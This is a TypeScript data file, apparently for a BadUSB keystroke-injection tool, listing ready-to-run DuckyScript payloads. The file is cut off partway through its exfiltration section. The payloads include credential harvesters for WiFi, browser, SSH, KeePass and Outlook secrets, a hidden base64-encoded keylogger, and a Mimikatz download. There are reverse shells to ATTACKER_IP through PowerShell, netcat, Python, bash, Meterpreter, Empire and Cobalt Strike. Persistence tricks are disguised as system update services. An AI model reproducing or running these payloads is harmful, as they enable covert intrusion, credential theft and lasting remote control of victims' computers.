import type { DuckyScript } from './types'

export const DUCKY_SCRIPTS: DuckyScript[] = [
  // ==================== RECON ====================
  {
    id: 'recon-sysinfo-win',
    name: 'Windows System Info Dump',
    category: 'recon',
    description: 'Gathers comprehensive system information including OS version, hardware specs, network config, and installed software. Saves to a text file on the desktop.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    script: `REM Windows System Info Dump
REM Opens PowerShell and dumps system information
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $info = @(); $info += "=== SYSTEM INFO ==="; $info += (systeminfo | Out-String); $info += "=== NETWORK ==="; $info += (ipconfig /all | Out-String); $info += "=== USERS ==="; $info += (net user | Out-String); $info | Out-File "$env:USERPROFILE\\Desktop\\sysinfo.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'recon-netconfig-win',
    name: 'Network Configuration Export',
    category: 'recon',
    description: 'Exports full network configuration including adapters, DNS, routing tables, and ARP cache.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    script: `REM Network Configuration Export
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = @(); $out += "=== IPCONFIG ==="; $out += (ipconfig /all | Out-String); $out += "=== ROUTE TABLE ==="; $out += (route print | Out-String); $out += "=== ARP CACHE ==="; $out += (arp -a | Out-String); $out += "=== NETSTAT ==="; $out += (netstat -an | Out-String); $out += "=== DNS CACHE ==="; $out += (Get-DnsClientCache | Format-Table -AutoSize | Out-String); $out | Out-File "$env:USERPROFILE\\Desktop\\netconfig.txt"
ENTER
DELAY 5000
STRING exit
ENTER`
  },
  {
    id: 'recon-wifi-harvest',
    name: 'WiFi Password Harvester',
    category: 'recon',
    description: 'Extracts all stored WiFi network profiles and their plaintext passwords from the Windows credential store.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    script: `REM WiFi Password Harvester
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING (netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-File "$env:USERPROFILE\\Desktop\\wifi_passes.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'recon-installed-sw',
    name: 'Installed Software List',
    category: 'recon',
    description: 'Lists all installed software from the registry including version numbers and install dates.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~7s',
    detectionDifficulty: 'easy',
    script: `REM Installed Software Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize | Out-File "$env:USERPROFILE\\Desktop\\installed_software.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'recon-browser-history',
    name: 'Browser History Export',
    category: 'recon',
    description: 'Exports Chrome browser history database including URLs, visit counts, and timestamps.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    script: `REM Browser History Export (Chrome)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $histPath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History"; $dest = "$env:USERPROFILE\\Desktop\\chrome_history.db"; Copy-Item $histPath $dest -Force; $urls = @(); Add-Type -AssemblyName System.Data.SQLite; $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dest"); $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 200"; $reader = $cmd.ExecuteReader(); while($reader.Read()){$urls += "$($reader['url']) | $($reader['title']) | Visits: $($reader['visit_count'])"}; $conn.Close(); $urls | Out-File "$env:USERPROFILE\\Desktop\\browser_history.txt"
ENTER
DELAY 4000
STRING exit
ENTER`,
    notes: 'Requires Chrome to be closed. Falls back if SQLite assembly not available.'
  },
  {
    id: 'recon-ad-enum',
    name: 'Active Directory Enumeration',
    category: 'recon',
    description: 'Enumerates Active Directory users, groups, computers, and OUs in a domain environment.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~15s',
    detectionDifficulty: 'moderate',
    script: `REM Active Directory Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Import-Module ActiveDirectory -ErrorAction SilentlyContinue; $out = @(); $out += "=== DOMAIN INFO ==="; $out += (Get-ADDomain | Out-String); $out += "=== DOMAIN CONTROLLERS ==="; $out += (Get-ADDomainController -Filter * | Select Name, IPv4Address | Out-String); $out += "=== USERS ==="; $out += (Get-ADUser -Filter * -Properties DisplayName,EmailAddress | Select Name,DisplayName,EmailAddress,Enabled | Out-String); $out += "=== GROUPS ==="; $out += (Get-ADGroup -Filter * | Select Name,GroupScope | Out-String); $out | Out-File "$env:USERPROFILE\\Desktop\\ad_enum.txt"
ENTER
DELAY 8000
STRING exit
ENTER`,
    notes: 'Requires domain-joined machine with RSAT tools or AD PowerShell module.'
  },
  {
    id: 'recon-usb-history',
    name: 'USB Device History',
    category: 'recon',
    description: 'Queries the registry for all USB devices that have been connected to the system, including serial numbers.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    script: `REM USB Device History
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\*\\*" | Select-Object FriendlyName, DeviceDesc, Mfg, Service, HardwareID | Format-Table -AutoSize | Out-File "$env:USERPROFILE\\Desktop\\usb_history.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'recon-clipboard-dump',
    name: 'Clipboard History Dump',
    category: 'recon',
    description: 'Captures the current clipboard content and Windows clipboard history (if enabled).',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    script: `REM Clipboard History Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $clip = Get-Clipboard -Raw; "=== CURRENT CLIPBOARD ===" | Out-File "$env:USERPROFILE\\Desktop\\clipboard.txt"; $clip | Out-File "$env:USERPROFILE\\Desktop\\clipboard.txt" -Append; "=== CLIPBOARD HISTORY ===" | Out-File "$env:USERPROFILE\\Desktop\\clipboard.txt" -Append; Get-Clipboard -Format Text -TextFormatType UnicodeText | Out-File "$env:USERPROFILE\\Desktop\\clipboard.txt" -Append
ENTER
DELAY 2000
STRING exit
ENTER`
  },

  // ==================== CREDENTIALS ====================
  {
    id: 'cred-sam-dump',
    name: 'SAM Database Dump (mimikatz)',
    category: 'credentials',
    description: 'Downloads and runs Mimikatz to dump SAM database credentials. Requires admin privileges.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~20s',
    detectionDifficulty: 'easy',
    script: `REM SAM Database Dump via Mimikatz
REM Requires administrative privileges
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString(\\\"https://ATTACKER_SERVER/mimikatz.ps1\\\"); Invoke-Mimikatz -Command \\\"privilege::debug sekurlsa::logonpasswords\\\" | Out-File C:\\Users\\Public\\creds.txt'"
ENTER
DELAY 1000
ALT y
DELAY 15000`,
    notes: 'Replace ATTACKER_SERVER with actual C2. UAC prompt will appear. Heavily flagged by AV.'
  },
  {
    id: 'cred-browser-pass',
    name: 'Browser Saved Passwords',
    category: 'credentials',
    description: 'Extracts saved passwords from Chrome using PowerShell and DPAPI decryption.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    script: `REM Chrome Saved Passwords Extractor
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $db = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"; $dest = "$env:TEMP\\logindata.db"; Copy-Item $db $dest -Force; Add-Type -AssemblyName System.Security; $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$dest"; $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"; $r = $cmd.ExecuteReader(); $out = @(); while($r.Read()){ $url = $r["origin_url"]; $user = $r["username_value"]; $encPass = [byte[]]$r["password_value"]; $decPass = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass,$null,"CurrentUser"); $pass = [System.Text.Encoding]::UTF8.GetString($decPass); $out += "$url | $user | $pass" }; $conn.Close(); $out | Out-File "$env:USERPROFILE\\Desktop\\chrome_creds.txt"
ENTER
DELAY 5000
STRING exit
ENTER`,
    notes: 'Chrome must be closed. Newer Chrome versions use AES-256-GCM encryption.'
  },
  {
    id: 'cred-wifi-extract',
    name: 'WiFi Credential Extract',
    category: 'credentials',
    description: 'Extracts all stored WiFi credentials in cleartext and exports them.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    script: `REM WiFi Credential Extraction
DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 800
STRING netsh wlan export profile key=clear folder="%USERPROFILE%\\Desktop\\wifi_profiles"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'cred-ssh-keys',
    name: 'SSH Key Exfiltration',
    category: 'credentials',
    description: 'Copies SSH private keys from the user .ssh directory to an accessible location.',
    targetOS: ['windows', 'linux', 'macos'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    script: `REM SSH Key Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $sshDir = "$env:USERPROFILE\\.ssh"; if(Test-Path $sshDir){ $dest = "$env:USERPROFILE\\Desktop\\ssh_keys"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Copy-Item "$sshDir\\*" $dest -Recurse -Force; "SSH keys copied to $dest" | Out-File "$dest\\README.txt" } else { "No .ssh directory found" | Out-File "$env:USERPROFILE\\Desktop\\no_ssh.txt" }
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'cred-win-credmanager',
    name: 'Windows Credential Manager Dump',
    category: 'credentials',
    description: 'Dumps stored credentials from Windows Credential Manager using cmdkey and vaultcmd.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    script: `REM Windows Credential Manager Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = @(); $out += "=== STORED CREDENTIALS (cmdkey) ==="; $out += (cmdkey /list | Out-String); $out += "=== VAULT CREDENTIALS ==="; $out += (vaultcmd /listcreds:"Windows Credentials" /all 2>&1 | Out-String); $out += (vaultcmd /listcreds:"Web Credentials" /all 2>&1 | Out-String); $out | Out-File "$env:USERPROFILE\\Desktop\\credmanager.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'cred-outlook-token',
    name: 'Outlook/Email Token Grab',
    category: 'credentials',
    description: 'Extracts Outlook OAuth tokens and cached email credentials from registry and profile data.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    script: `REM Outlook Token Extraction
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = @(); $out += "=== OUTLOOK PROFILES ==="; $out += (Get-ItemProperty "HKCU:\\Software\\Microsoft\\Office\\*\\Outlook\\Profiles\\*\\*" -ErrorAction SilentlyContinue | Out-String); $out += "=== CACHED TOKENS ==="; $tokPath = "$env:LOCALAPPDATA\\Microsoft\\TokenBroker\\Cache"; if(Test-Path $tokPath){ Get-ChildItem $tokPath -Recurse | ForEach-Object { $out += "--- $($_.Name) ---"; $out += (Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue) }}; $out | Out-File "$env:USERPROFILE\\Desktop\\outlook_tokens.txt"
ENTER
DELAY 5000
STRING exit
ENTER`
  },
  {
    id: 'cred-keylogger',
    name: 'PowerShell Keylogger Install',
    category: 'credentials',
    description: 'Installs a lightweight PowerShell keylogger that captures keystrokes to a hidden log file.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'hard',
    script: `REM PowerShell Keylogger Install
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = '$api = Add-Type -MemberDefinition ''[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);'' -Name "KL" -PassThru; $logFile = "$env:TEMP\\kl.log"; while($true){ for($i=8;$i -le 190;$i++){ if($api::GetAsyncKeyState($i) -eq -32767){ $key = [System.Enum]::GetName([System.Windows.Forms.Keys],$i); $ts = Get-Date -Format "HH:mm:ss"; "$ts : $key" | Out-File $logFile -Append }}; Start-Sleep -Milliseconds 40}'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell -ArgumentList "-WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden
ENTER
DELAY 2000
STRING exit
ENTER`,
    notes: 'Keystrokes logged to %TEMP%\\kl.log. Run continuously until process killed.'
  },
  {
    id: 'cred-keepass-extract',
    name: 'KeePass Database Locate',
    category: 'credentials',
    description: 'Searches for KeePass database files (.kdbx) across common locations and copies them.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~12s',
    detectionDifficulty: 'moderate',
    script: `REM KeePass Database Locator
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $dest = "$env:USERPROFILE\\Desktop\\kp_files"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Get-ChildItem -Path "C:\\Users" -Recurse -Filter "*.kdbx" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName "$dest\\$($_.Name)" -Force; $_.FullName | Out-File "$dest\\locations.txt" -Append }; "Search complete" | Out-File "$dest\\done.txt"
ENTER
DELAY 8000
STRING exit
ENTER`
  },

  // ==================== REVERSE SHELLS ====================
  {
    id: 'revshell-powershell',
    name: 'PowerShell Reverse Shell',
    category: 'reverse-shells',
    description: 'Establishes a reverse PowerShell session to the attacker machine using TCP sockets.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    script: `REM PowerShell Reverse Shell
REM Replace ATTACKER_IP and PORT
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING $c = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){ $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r = (iex $d 2>&1 | Out-String); $r2 = $r + "PS " + (pwd).Path + "> "; $sb = ([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush() }; $c.Close()
ENTER`,
    notes: 'Replace ATTACKER_IP with your listener IP. Start listener with: nc -lvnp 4444'
  },
  {
    id: 'revshell-netcat',
    name: 'Netcat Reverse Shell',
    category: 'reverse-shells',
    description: 'Downloads netcat (ncat) and establishes a reverse shell with persistent reconnection.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    script: `REM Netcat Reverse Shell
REM Replace ATTACKER_IP
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri "https://ATTACKER_SERVER/nc.exe" -OutFile "$env:TEMP\\nc.exe"; Start-Process "$env:TEMP\\nc.exe" -ArgumentList "-e cmd.exe ATTACKER_IP 4444" -WindowStyle Hidden
ENTER`,
    notes: 'Host nc.exe on attacker server. Many AV will flag nc.exe.'
  },
  {
    id: 'revshell-python',
    name: 'Python Reverse Shell',
    category: 'reverse-shells',
    description: 'Uses Python (if installed) to create a reverse shell connection.',
    targetOS: ['windows', 'linux', 'macos'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    script: `REM Python Reverse Shell
REM Replace ATTACKER_IP
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" 2>$null; python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
ENTER`,
    notes: 'Tries python then python3. Requires Python installed on target.'
  },
  {
    id: 'revshell-bash',
    name: 'Bash Reverse Shell',
    category: 'reverse-shells',
    description: 'Creates a bash reverse shell on Linux/macOS targets via /dev/tcp.',
    targetOS: ['linux', 'macos'],
    riskLevel: 'critical',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    script: `REM Bash Reverse Shell (Linux/macOS)
REM Replace ATTACKER_IP
DELAY 1000
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
ENTER
DELAY 500
STRING disown
ENTER
STRING exit
ENTER`,
    notes: 'For macOS uses Spotlight to launch Terminal. For Linux, adapt GUI shortcut.'
  },
  {
    id: 'revshell-meterpreter',
    name: 'Meterpreter Stager',
    category: 'reverse-shells',
    description: 'Downloads and executes a Meterpreter reverse_https stager for Metasploit.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~12s',
    detectionDifficulty: 'hard',
    script: `REM Meterpreter Stager (reverse_https)
REM Replace ATTACKER_IP
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX(New-Object Net.WebClient).DownloadString("https://ATTACKER_IP:8443/payload.ps1")
ENTER`,
    notes: 'Generate payload: msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=8443 -f psh -o payload.ps1'
  },
  {
    id: 'revshell-empire',
    name: 'Empire Stager',
    category: 'reverse-shells',
    description: 'PowerShell Empire stager that establishes an encrypted C2 channel.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    script: `REM PowerShell Empire Stager
REM Replace STAGER_URL with Empire listener URL
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX($wc.DownloadString("https://STAGER_URL/stage0"))
ENTER`,
    notes: 'Configure Empire listener first. Uses system proxy for egress.'
  },
  {
    id: 'revshell-cobaltstrike',
    name: 'Cobalt Strike Beacon (template)',
    category: 'reverse-shells',
    description: 'Template for deploying a Cobalt Strike beacon via PowerShell cradle.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~10s',
    detectionDifficulty: 'very-hard',
    script: `REM Cobalt Strike Beacon Stager
REM Replace TEAMSERVER_URL
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $data = (New-Object Net.WebClient).DownloadData("https://TEAMSERVER_URL/beacon.bin"); $assembly = [System.Reflection.Assembly]::Load($data); $assembly.EntryPoint.Invoke($null, @(,[string[]]@()))
ENTER`,
    notes: 'Template only. Requires configured Cobalt Strike team server and generated beacon.'
  },

  // ==================== PERSISTENCE ====================
  {
    id: 'persist-registry-run',
    name: 'Registry Run Key',
    category: 'persistence',
    description: 'Adds a registry Run key to execute a payload every time the user logs in.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    script: `REM Registry Run Key Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\update.ps1" -PropertyType String -Force
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Payload (update.ps1) must be placed at the specified path separately.'
  },
  {
    id: 'persist-schtask',
    name: 'Scheduled Task Persistence',
    category: 'persistence',
    description: 'Creates a scheduled task that runs a payload at user logon and every 30 minutes.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    script: `REM Scheduled Task Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\task.ps1"; $trigger1 = New-ScheduledTaskTrigger -AtLogon; $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30); Register-ScheduledTask -TaskName "Microsoft\\Windows\\Maintenance\\SystemHealthCheck" -Action $action -Trigger $trigger1,$trigger2 -Description "System Health Monitor" -Force
ENTER
DELAY 2000
STRING exit
ENTER`
  },
  {
    id: 'persist-wmi-event',
    name: 'WMI Event Subscription',
    category: 'persistence',
    description: 'Creates a WMI permanent event subscription for fileless persistence.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'hard',
    script: `REM WMI Event Subscription Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $filterName = "SystemCoreFilter"; $consumerName = "SystemCoreConsumer"; $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"; $wmiParams = @{Namespace = "root\\subscription"; ErrorAction = "Stop"}; $filter = Set-WmiInstance -Class __EventFilter -Arguments @{Name=$filterName; EventNamespace="root\\cimv2"; QueryLanguage="WQL"; Query=$query} @wmiParams; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name=$consumerName; CommandLineTemplate="powershell -WindowStyle Hidden -File C:\\Users\\Public\\wmi.ps1"} @wmiParams; Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} @wmiParams
ENTER
DELAY 3000
STRING exit
ENTER`,
    notes: 'Survives reboots. Requires admin. Very stealthy but detectable by Sysmon.'
  },
  {
    id: 'persist-startup-folder',
    name: 'Startup Folder Drop',
    category: 'persistence',
    description: 'Drops a VBS launcher into the user Startup folder for login persistence.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    script: `REM Startup Folder Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $vbs = 'Set objShell = WScript.CreateObject("WScript.Shell")' + [char]13 + 'objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\startup.ps1", 0, False'; $startupPath = [Environment]::GetFolderPath("Startup"); $vbs | Out-File "$startupPath\\MicrosoftEdgeUpdate.vbs" -Encoding ASCII
ENTER
DELAY 2000
STRING exit
ENTER`
  },
  {
    id: 'persist-service-install',
    name: 'Service Installation',
    category: 'persistence',
    description: 'Installs a Windows service that runs as SYSTEM for persistent access.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    script: `REM Windows Service Persistence
REM Requires admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command New-Service -Name \\\"WinDefendUpdate\\\" -BinaryPathName \\\"C:\\\\Users\\\\Public\\\\svc.exe\\\" -DisplayName \\\"Windows Defender Update Service\\\" -StartupType Automatic -Description \\\"Provides real-time protection updates\\\"; Start-Service WinDefendUpdate'"
ENTER
DELAY 1000
ALT y
DELAY 3000`,
    notes: 'Requires admin (UAC bypass). Service binary must be placed first.'
  },
  {
    id: 'persist-dll-hijack',
    name: 'DLL Hijack Setup',
    category: 'persistence',
    description: 'Identifies DLL hijacking opportunities and places a malicious DLL in the search path.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~15s',
    detectionDifficulty: 'very-hard',
    script: `REM DLL Hijack Enumeration & Setup
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $procs = Get-Process | Where-Object {$_.Path -and $_.Path -notlike "*\\Windows\\*"} | Select-Object -Unique Path; $out = @(); foreach($p in $procs){ $dir = Split-Path $p.Path; $dlls = Get-ChildItem "$dir\\*.dll" -ErrorAction SilentlyContinue | Select-Object Name; $out += "=== $($p.Path) ==="; $out += ($dlls | Out-String) }; $out | Out-File "$env:USERPROFILE\\Desktop\\dll_enum.txt"; "Enumeration complete" | Out-File "$env:USERPROFILE\\Desktop\\dll_enum_done.txt"
ENTER
DELAY 10000
STRING exit
ENTER`,
    notes: 'First step is enumeration. Actual DLL placement requires further analysis of missing DLLs.'
  },
  {
    id: 'persist-crontab-linux',
    name: 'Crontab Persistence (Linux)',
    category: 'persistence',
    description: 'Adds a cron job that executes a reverse shell every 5 minutes on Linux targets.',
    targetOS: ['linux'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    script: `REM Crontab Persistence (Linux)
DELAY 1000
CTRL ALT t
DELAY 1000
STRING (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Replace ATTACKER_IP. Visible in crontab -l output.'
  },
  {
    id: 'persist-launchagent-mac',
    name: 'LaunchAgent Persistence (macOS)',
    category: 'persistence',
    description: 'Creates a macOS LaunchAgent plist for persistent execution at user login.',
    targetOS: ['macos'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    script: `REM macOS LaunchAgent Persistence
DELAY 1000
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING cat > ~/Library/LaunchAgents/com.apple.systemupdate.plist << 'EOF'
ENTER
STRING <?xml version="1.0" encoding="UTF-8"?>
ENTER
STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
ENTER
STRING <plist version="1.0"><dict><key>Label</key><string>com.apple.systemupdate</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>
ENTER
STRING EOF
ENTER
DELAY 500
STRING launchctl load ~/Library/LaunchAgents/com.apple.systemupdate.plist
ENTER
STRING exit
ENTER`
  },

  // ==================== EXFILTRATION ====================
  {
    id: 'exfil-doc-grab',
    name: 'Document Grab (Recent Files)',
    category: 'exfiltration',
    description: 'Collects recent documents (.doc, .pdf, .xlsx, .pptx) and stages them for exfiltration.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~15s',
    detectionDifficulty: 'moderate',
    script: `REM Document Grab - Recent Files
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
